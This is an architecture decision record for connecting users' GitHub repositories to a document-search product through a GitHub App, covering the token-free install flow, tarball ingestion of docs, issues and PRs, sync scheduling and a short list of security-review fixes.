## ADR-0023: GitHub via a GitHub App; docs + issues/PRs; tarball instead of clone
**Status:** Accepted (2026-11-25, M4).
**Context:** Open sign-up (ADR-0021) means every account connects its *own* repositories. The owner chose (2026-11-25): a GitHub App (not personal access tokens), index docs plus issues and PRs (no code yet: embedding a codebase would use a workspace's $0.25 monthly allowance in one sync), hourly sync without webhooks, and no dispatch token yet.
**Decision:**
1. **Install flow, no stored secrets.**
   - `install_link` signs a 15-minute `state` bound to the user and workspace.
   - The app has "Request user authorization (OAuth) during installation" on, so GitHub redirects back with `installation_id`, `code` and `state`.
   - The API checks the state, exchanges the code for a user token, and confirms through `GET /user/installations` that this user can access that installation, then revokes the token. Installation ids are sequential, so without this check anyone could claim someone else's installation and index their private repos.
   - A signed 30-minute grant then authorises listing and connecting repos, so the picker needs no table.
   - The worker mints 1-hour installation tokens from the app's private key (an RS256 JWT signed with `cryptography`, the one new dependency) and keeps them in memory only. Fernet credentials aren't needed.
2. **One source per repo** (name `owner/repo`, unique per workspace), always **workspace-only and private data**, even for a public repo (security review). Anyone can sign up and connect a public repo, so making it visible to all accounts would let spam or injected text reach everyone's answers. A public repo made private later must also never stay public.
3. **Content.**
   - Docs come from one tarball download per changed default branch: Markdown, MDX, text, reStructuredText and well-known root files. Vendored, generated and hidden directories are skipped. Caps: 256 KB per file, 500 files and a 50 MB tarball. Symlinks and anything that isn't a regular file are ignored.
   - Issues and PRs come from REST with `since`. Each one, with up to 100 comments, becomes one Markdown document, capped at 100k characters; at most 300 issues per sync.
   - Unchanged files are skipped by checksum before any spend. Files gone from the repo are pruned.
   - This replaces ARCHITECTURE's `git clone`: a tarball is one API call, needs no `git` binary, and keeps tokens out of clone URLs.
4. **Pipeline reuse** (rules 2 and 3): `GitHubApi` only fetches. `GitHubSync` turns results into `DocumentUpsert`s and calls `IngestService.index_document`, so spend caps, idempotency, ACL triggers and run history are shared with uploads.
5. **Scheduling.**
   - Worker housekeeping queues `sync_github` for each due repo, keyed per source per hour.
   - Connecting queues an initial sync. "Sync now" runs that waiting initial job, or otherwise a manual one (one per repo per 5 minutes).
   - In the API these run **inline** with a 90 s budget and stop cleanly at it: progress is checkpointed, the run is marked `partial`, and a continuation job is queued.
   - GitHub rate limits are honoured (`Retry-After` and `x-ratelimit-reset`) and saved as a partial run that the queue retries.
6. **Disconnect** deletes the source; documents, chunks and runs cascade. Nothing changes on GitHub.
**Consequences:** No webhooks, so a push is searchable within the next hourly sync or straight after "Sync now", which meets the M4 done-when. Code search waits for a later phase and an explicit budget decision. `TRUSTED_IP_HEADER` is now required for the API only (`Settings.require_api_settings`): the worker also runs with `ENV=prod` and would otherwise refuse to start. `sync.yml` now passes the worker its OpenAI, storage and GitHub App secrets.
**Security review (2026-11-25), fixed:**
- Repos are always workspace-only and private data.
- The grant carries only the repos *this user* can read through the installation (`/user/installations/{id}/repositories` with their own token), so an org member can't index repos the app sees but they can't.
- The tarball is read in streaming mode with caps of 50k entries and 200 MB unpacked.
- The deadline is checked before each GitHub call.
- Pagination follows only `api.github.com` links, and token-bearing calls don't follow redirects.

**Accepted:** the inline runner's 120 s timeout stays the hard outer bound, inside Vercel's 300 s; a GitHub rate-limit wait can still use part of it.
